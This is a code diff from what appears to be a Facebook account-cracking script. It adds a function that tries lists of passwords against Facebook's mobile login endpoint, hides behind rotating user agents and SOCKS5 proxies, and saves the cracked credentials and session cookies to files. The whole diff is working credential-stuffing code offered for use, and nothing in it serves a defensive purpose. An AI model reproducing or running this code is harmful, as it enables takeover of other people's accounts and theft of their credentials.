@@ -892,7 +892,7 @@ def setting():
     else:
         print(' [+] Pilih Yang Bener Sayang ')
         exit()
-    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white] Metode Async[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Metode Mbasic[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white] Metode new[bold white] [/]',subtitle="╭───", subtitle_align="left", title="[bold green] Method"))
+    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white] Metode Async[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Metode Mbasic[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white] Metode Iphone[bold white] [/]',subtitle="╭───", subtitle_align="left", title="[bold green] Method"))
     hc = Console().input(f"[bold cyan]   ╰─> ")
     if hc in ['1','01']:
         method.append('_async')
@@ -993,8 +993,70 @@ def passwrd():
 		time.sleep(2)
 		exit()
 
-
 def methodnew(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	ua = random.choice(free) 
+	#ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	prog.update(des,description=f"{k}iphone.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.advance(des) 
+	for pw in pwv:
+		try:
+			if 'ya' in uman: ua = usman1[0]
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			link=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
+			data = {
+'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+'try_number': 0,
+'unrecognized_tries': 0,
+'email':idf,
+'pass':pw,
+'login':'Masuk',
+'prefill_contact_point': idf, 
+'prefill_source': '',
+'prefill_type': '',
+'first_prefill_source': 'header',
+'first_prefill_type': 'contact_point',
+'had_cp_prefilled': 'true', 
+'had_password_prefilled': 'true', 
+'is_smart_lock': 'false', 
+'bi_xrwh': 0
+}
+			heade ={'Host':'iphone.facebook.com','x-fb-rlafr': '0','access-control-allow-origin':'*','strict-transport-security':'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug':'6kPPqq1tVlNAOQKlMbyQJKyIsCy+xVvedl1dnfzMw+SSrLi3buNNbTwQ+EKhqari1Co/wiELTB87WFOow+VCZw==','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="113", "Not=A?Brand";v="99","Google Chrome";v="113"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-javascript; charset=utf-8','user-agent': ua,'accept':'*/*','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer':'https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
+			po = ses.post('https://iphone.facebook.com/login/device-based/login/async/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&refsrc=deprecated&lwv=101',data=data,headers=heade)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				tree = Tree(f" ")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}\n")
+				cetak(tree)
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				tree = Tree(f"  ")
+				tree.add(f"[bold green]{idf}|{pw}")
+				tree.add(f"[bold green]{kuki}")
+				tree.add(f"[bold green]{ua}\n")
+				cetak(tree) 
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				cek_apk(session,coki)
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+def methodnewwqw(idf,pwv):
 	global loop,ok,cp
 	ses = requests.Session()
 	ua = random.choice(free)
